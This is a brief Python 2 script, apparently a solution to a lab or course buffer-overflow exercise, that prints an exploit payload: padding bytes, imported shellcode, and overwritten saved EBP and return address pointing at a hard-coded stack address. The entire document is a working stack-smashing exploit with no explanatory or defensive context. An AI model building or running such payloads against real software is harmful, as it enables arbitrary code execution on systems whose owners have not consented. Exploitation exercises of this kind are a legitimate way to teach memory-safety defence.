from shellcode import shellcode 
from struct import pack 

shellcode_addr = 0xbffe99c0 
ebp = 0xbffe99f8

print  "\xff" + "\xff" + "\xff" + "\xff" + shellcode + "\xff"*33 + pack("<I",ebp) + pack("<I",shellcode_addr)

